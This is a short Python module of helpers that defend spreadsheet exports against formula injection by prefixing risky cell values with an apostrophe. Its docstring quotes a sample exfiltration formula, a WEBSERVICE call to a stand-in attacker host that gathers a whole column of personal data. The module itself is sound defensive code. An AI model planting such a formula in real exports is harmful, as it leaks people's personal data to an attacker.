"""Excel export hardening helpers.

Shared utilities to neutralize stored spreadsheet formula injection (CSV/Excel
injection) when exporting user-influenced data into ``.xlsx`` files that staff
later download and open.
"""

from typing import Any

# Leading characters that make Excel / LibreOffice interpret a cell as a formula.
_FORMULA_TRIGGERS = frozenset({"=", "+", "-", "@"})
# Leading control characters some spreadsheet apps also treat specially.
_CONTROL_TRIGGERS = frozenset({"\t", "\r", "\n"})


def excel_safe_cell_value(value: Any) -> Any:
    """Neutralize spreadsheet formula injection in an exported cell value.

    A string beginning with ``=``, ``+``, ``-``, ``@`` (or a leading tab/CR/LF) is
    promoted to a live formula cell by Excel / LibreOffice when the file is opened.
    Student- or other low-privilege-controlled free text written verbatim into an
    ``.xlsx`` a reviewer later opens can therefore run e.g.
    ``=WEBSERVICE("https://attacker/x?d="&TEXTJOIN(",",TRUE,N:N))`` — referencing
    the whole sheet, not just the attacker's own row — to exfiltrate the cohort's
    PII columns. Prefixing such strings with an apostrophe forces the cell to be
    treated as literal text; the apostrophe is not shown to the reader.

    Non-string values (int, float, None, datetime, ...) are returned unchanged so
    numeric/typed cells keep their native type.
    """
    if not isinstance(value, str) or not value:
        return value
    if value[0] in _FORMULA_TRIGGERS or value[0] in _CONTROL_TRIGGERS:
        return "'" + value
    return value
